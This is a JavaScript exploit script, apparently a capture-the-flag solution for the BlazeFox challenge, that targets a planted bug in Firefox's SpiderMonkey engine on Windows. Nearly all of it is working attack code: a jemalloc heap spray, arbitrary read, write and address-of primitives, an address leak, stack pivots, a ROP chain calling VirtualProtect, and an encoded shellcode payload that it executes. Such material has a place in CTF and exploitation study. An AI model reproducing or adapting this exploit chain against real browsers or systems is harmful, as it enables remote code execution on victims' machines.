// Jonathan "Kondara" - October 10, 2018 - @0xKondara
// Thanks to @0vercl0k and doom for the keeping me motivated,
// answering dumb questions, and just being all around awesome people.

// Load Int library, thanks saelo!
load('utils.js');
load('int64.js');

// Setup
var spray_size  = 66000;
var container   = new Array();

// Magic values
var target_marker1          = 0x61414161;
var target_marker2          = 0x62424262;
var target_addrOf_marker    = 0x63434363;
var target_read64_marker    = 0x64444464;
var target_write64_marker   = 0x65454565;
var marker1                 = new Int64('0x6141416161414161').asDouble();
var marker2                 = new Int64('0x6242426262424262').asDouble();
var addrOf_marker           = 0x63434363;
var read64_marker           = new Int64('0x6444446464444464').asDouble();
var write64_marker          = new Int64('0x6545456565454565').asDouble();

function TriggerGC() {
    console.log("[*] Triggering garbage collection");
    var gca = new Array();

    for (var i = 0; i < 8000000; i++) {
        str = encodeURIComponent("A://A://A://A://");
        gca[i] = str;
    }

    return gca;
}

function ContainerSetup() {
    var gc_ret = null;

    console.log("[*] Spraying objects");

    // Creating an Array of Arrays large enough to ensure they get moved to the jemalloc heap.
    for (var i = 0; i < spray_size; i++) {
        container[i] = new Array();

        for (var j = 0; j < 11; j += 1)
            container[i][j] = 0x41454541;
    }

    console.log("[*] Creating holes in the jemalloc heap");

    // For every three allocations we free two of them to create holes for Uint32Array's we will place after.
    for (var i = 0; i < spray_size; i += 3) {
        delete(container[i + 1]);
        container[i + 1] = null;
        container[i + 1] = undefined;

        delete(container[i + 2]);
        container[i + 2] = null;
        container[i + 2] = undefined;
    }

    gc_ret = TriggerGC();

    console.log("[*] Positioning the Uint32Array's");

    // Creating Uint32Arrays in the holes created on the jemalloc heap.
    for (var i = 0; i < spray_size; i += 3) {
        container[i + 1] = new Uint32Array(22);
        container[i + 2] = new Uint32Array(22);

        for (var j = 0; j < 22; j++) {
            container[i + 1][j] = 0x45474745;
            container[i + 2][j] = 0x46474746;
        }

        // Mark up the beginning of arrays so we can validate our setup.
        container[i + 1][0] = target_marker1;
        container[i + 1][1] = target_marker1;
        container[i + 2][0] = target_marker2;
        container[i + 2][1] = target_marker2;
    }
}

function Exploit(){
    var corrupted_index     = null;
    var addrOf_index        = null;
    var read64_index        = null;
    var write64_index       = null;
    var marker1_index       = 22;
    var marker2_index       = 42;
    var marker_addrof_index = 60;
    var leak_index          = 17;
    var js_offset           = new Int64("0x8092C0");

    // Object to hold our primitives
    let prims = {};

    console.log("[*] Triggering vuln and finding a layout we can use");

    for (var i = 30; i < spray_size; i += 3) {
        // Vulnerable function introduced for BlazeFox challenge of BlazeCTF
        // https://ctftime.org/task/6000 - Thank you itsZN!
        container[i].blaze();
        if ((container[i][marker2_index] == marker2) && (container[i][marker1_index] == marker1)) {
            corrupted_index = i;
            console.log("[*] Found usable index at container[" + corrupted_index + "]");
            break;
        }
    }

    if(corrupted_index == null) {
        console.log("[!] Game over - failed to find a valid layout.")
        return 0;
    }

    // Find indexes we will use for our primatives
    // Of note our array for addrOf is of the same type of array we are using to access it so we must use Intergers instead of Doubles for that index marker. 
    container[corrupted_index][marker_addrof_index] = addrOf_marker;
    container[corrupted_index][marker2_index] = read64_marker;
    container[corrupted_index][marker1_index] = write64_marker;

    for (var i = 0; i < spray_size; i++) {
        switch (container[i][0]) {
            case target_addrOf_marker:
                addrOf_index = i;
                console.log("[*] Found index for addrOf primative at container[" + addrOf_index + "]");
                break;
            case target_read64_marker:
                read64_index = i;
                console.log("[*] Found index for read64 primative at container[" + read64_index + "]");
                break;
            case target_write64_marker:
                write64_index = i;
                console.log("[*] Found index for write64 primative at container[" + write64_index + "]");
                break;
        }

        // Exit our loop if we have found all our indexes.
        if (addrOf_index && read64_index && write64_index)
            break;
    }

    // If one of our indexes is not found, we fail.
    if(!addrOf_index || !read64_index || !write64_index) {
        console.log("[!] Game over - failed to find an index for a primative.")
        return 0;
    }

    // We create a fake string object and place it on our read64 index array. Since this is a string what we read will be returned as ASCII.
    // ascii_to_hexa from out utils will handle the ASCII text for us and convert them to hex.
    prims.read64 = function(addr) {
        var fakeString = {
            'dataPointerAndType': new Int64(Add(Int64.fromDouble(container[corrupted_index][marker2_index - 1]), new Int64("0xfffb000000000010"))),
            'lengthAndFlags': new Int64('0x0000000800000042').asDouble(),
            'addrToRead': new Int64(addr).asDouble()
        };

        container[read64_index][0] = new Int64(hexlify(fakeString.dataPointerAndType.bytes().reverse().slice(4,8)).toString());
        container[read64_index][1] = new Int64(hexlify(fakeString.dataPointerAndType.bytes().reverse().slice(0,4)).toString());
        container[corrupted_index][marker2_index + 2] = fakeString.lengthAndFlags;
        container[corrupted_index][marker2_index + 3] = fakeString.addrToRead;

        return new Int64(ascii_to_hexa(container[corrupted_index][marker2_index]).slice(4));
    }

    // Overwrite the data pointer of the array object so that accessing the array directly writes data directly to the location we choose.
    prims.write64 = function(addr, value) {
        container[corrupted_index][marker1_index - 1] = new Int64(addr).asDouble();
        container[write64_index][0] = new Int64(hexlify(value.bytes().reverse().slice(4,8))).toString();
        container[write64_index][1] = new Int64(hexlify(value.bytes().reverse().slice(0,4))).toString();
    }

    // Create a fake property for our specific array object that points to the object whose address we want.
    // We can then use our read64 primative to read the pointer and to get the address of the object.
    // https://saelo.github.io/posts/firefox-script-loader-overflow.html
    prims.addrOf = function(x) {
        container[addrOf_index].fakeProp = x;
        var prop_ptr = Int64.fromDouble(container[corrupted_index][marker_addrof_index - 4]);
        return prims.read64(prop_ptr);
    }

    var js_leak = Int64.fromDouble(container[corrupted_index][leak_index]);
    var js_base = new Int64(js_leak - js_offset);
    console.log("[*] Leaked js base address: " + js_base.toString());

    // Here we create a function object that we will use to eventually control RIP.
    // https://blog.ret2.io/2018/07/11/pwn2own-2018-jsc-exploit/#arbitrary-code-execution
    var JitMePlease = function(x) { var a = []; a[0] = 0x4060; return x*5 + x - x*x /0x2313 +(x-x+0x8520*(x+3-x / x+0x414)/0x4144); }
    for (var i = 0; i < 20; i++) {
        JitMePlease(i);
    }

    // Occassionally a crash happens here. The three possible offsets are 0x36AE70, 0x36A160, and 0x368558. One may be more stable than the other, but haven't tested.
    var rsi_pointer = new Int64(Sub(prims.addrOf(container[0]), new Int64("0x36AE70")));
    var rsi_address = prims.read64(rsi_pointer);

    // Stack pivot #1
    // 0x1406d3719: push rsi ; pop rsp ; mov  [rsi+0x54], ecx ; mov rcx, rsi ; mov rax, qword [rsi] ; call qword [rax+0x00000140] ;
    prims.write64(prims.read64(Add(prims.addrOf(JitMePlease), 0x30)), Add(js_base, new Int64("0x6D3719")));

    // Stack pivot #3
    // 0x1406efd8d: add rsp, 0x0000000000000120 ; pop rdi ; pop rsi ; pop rbx ; ret  ;
    prims.write64(Add(prims.addrOf(container[1]), new Int64("0x68")), Add(js_base, new Int64("0x6EFD8D")));
    prims.write64(rsi_address, Add(prims.addrOf(container[1]), new Int64("0x40")));

    var shellcode = unescape("%u3148%u48c9%ue981%uffdd%uffff%u8d48%uef05%uffff%u48ff%u17bb%u91c4%u8617%u3cb1%u4802%u5831%u4827%uf82d%uffff%ue2ff%uebf4%u128c%u76f3%ufc59%u1702%ud0c4%uc746%u6ee1%u4153%ua08c%ue3c5%ub7f9%u7750%u1a8c%u9e45%ub7f9%u3750%u1a8c%ud665%u33f9%u5db5%udc8e%u4f26%u0df9%ubbc2%uf0f8%u846b%u1c9d%ud643%u9c0d%u8756%ude70%u45ef%uc085%u0d5f%u1ce3%u5589%ud9f8%u5616%ubc3a%u178a%u91c4%u035f%u4871%u5f65%u41c5%u0d47%u24f9%u9c46%ub184%u875e%udf61%u5f54%u583b%u0d56%ub485%u164a%udc12%u4f26%u0df9%ubbc2%u5085%u8bde%u3df0%u2fc3%ue424%ucae6%u70b2%u1f26%ua881%uf3c6%u6469%u9c46%ub584%u875e%u5a61%u9c43%ud9c8%u0d53%u20f1%u164b%ud014%u829c%u7439%uc703%uc985%ude56%u65ef%u5658%ud09c%uc74e%u74eb%ufb81%ud0e4%u7945%u6451%u4e43%ud99e%u949c%u6b58%ue8fd%ucc3b%u3c5f%u3cb0%u1702%u91c4%u8617%ub1f9%u168f%u91c5%uc717%u0d0b%u7889%u6e43%u3dc2%u8941%u41a0%u2b85%u13b1%ua10c%uc2fd%u128c%uaed3%u3a8d%u1d7e%u6a44%uf3f7%u87b4%u0445%ufeb6%u867d%u7de8%ucd8b%u443b%ue774%u5fdd%u722c%uf4bc%u8617%u3cb1%u4102");
    var shellcode_loc = prims.read64(Add(prims.addrOf(shellcode), new Int64("0x08")));

    var rop = [
        new Int64(Add(js_base, new Int64("0x25A44E"))), // Stack pivot #2
                                                        // 0x14025a44e: xchg rax, rsp ; add eax,  [rax] ; mov rdi, qword [rsp+0x30] ; mov rbx, qword [rsp+0x40] ; add rsp, 0x20 ; pop rsi ; ret  ;
        Int64.Zero, Int64.Zero, Int64.Zero, Int64.Zero,
        new Int64(Add(js_base, new Int64("0x02440A"))), // 0x14002440a: pop r8 ; ret 
        new Int64(prims.addrOf(container[50000])),      // lpflOldProtect
        new Int64(Add(js_base, new Int64("0x02D332"))), // 0x14002d332: pop rdx ; ret
        new Int64(prims.addrOf(container[40000])),      // something for the next gadget to deref - r9 was a pain >.<
        new Int64(Add(js_base, new Int64("0x1E98D0"))), // 0x1401e98d0: mov r9, r8 ; mov qword [rcx+0x08], r9 ; mov eax,  [rdx+0x00000080] ; mov  [rcx+0x10], eax ; mov rax, rcx ; mov qword [rcx+0x18], r8 ; mov qword [rcx+0x20], r8 ; ret
        new Int64(Add(js_base, new Int64("0x02440A"))), // 0x14002440a: pop r8 ; ret 
        new Int64("0x0040"),                            // flNewProtect
        new Int64(Add(js_base, new Int64("0x02D332"))), // 0x14002d332: pop rdx ; ret
        new Int64("0x1000"),                            // dwSize
        new Int64(Add(js_base, new Int64("0x1AD09C"))), // 0x1401ad09c: pop rcx ; ret
        new Int64(shellcode_loc),                       // lpAddress
        new Int64(Add(js_base, new Int64("0x1D6AD7"))), // pop rax ; jmp qword [rax+0x10]
        new Int64(Add(js_base, new Int64("0x7A90E0"))), // js!_imp_VirtualProtect - 10
        new Int64(shellcode_loc),                       // return addr
        new Int64(shellcode_loc),                       // return addr
    ];

    var rop_loc = new Int64(Add(prims.addrOf(container[1]), new Int64("0x180")));
    console.log("[*] Writing ROP chain at " + rop_loc);
    for (var i = 0; i < rop.length; i++)
        prims.write64(Add(rop_loc, i * new Int64("0x8")), rop[i]);

    // Useful Debug Breakpoint
    Math.atan2();

    console.log("[*] Fire in the hole!");
    JitMePlease(1);
}

console.log(" __  __                 __                       \n\
|  |/  |.-----.-----.--|  |.---.-.----.---.-.    \n\
|     < |  _  |     |  _  ||  _  |   _|  _  |    \n\
|__|\\__||_____|__|__|_____||___._|__| |___._|    \n\
");

ContainerSetup();
Exploit();